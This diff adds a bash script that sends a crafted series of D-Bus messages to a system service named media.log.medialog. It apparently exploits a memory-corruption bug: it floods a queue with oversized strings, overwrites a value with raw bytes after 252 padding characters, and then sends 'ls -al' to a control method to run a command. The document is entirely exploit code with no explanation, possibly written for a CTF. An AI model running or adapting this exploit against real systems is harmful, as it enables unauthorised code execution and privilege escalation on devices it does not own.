@@ -1,1 +1,15 @@
 #!/bin/bash
+dbus-send --system /media/log/medialog media.log.medialog.Dbg string:54
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..40482})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..40493})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..40493})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..40493})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..40493})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 aaaaa"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..252})$(printf '\x31\xe5\xbe\xbf')"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:'1 a'
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:'2 5'
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"0 aaaaaaaa"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:'1 a'
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:'2 6'
+dbus-send --system /media/log/medialog media.log.medialog.Cntrl string:"ls -al"
